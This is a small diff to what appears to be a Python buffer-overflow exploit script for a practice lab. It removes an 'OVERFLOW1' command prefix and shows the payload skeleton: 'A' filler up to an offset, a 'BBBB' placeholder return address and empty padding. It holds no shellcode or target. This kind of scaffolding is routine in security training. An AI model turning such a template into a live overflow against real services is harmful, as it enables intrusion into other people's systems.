@@ -3,7 +3,6 @@ import socket
 
 
 
-prefix = "OVERFLOW1 "
 overflow = "A" * offset
 retn = "BBBB"
 padding = ""
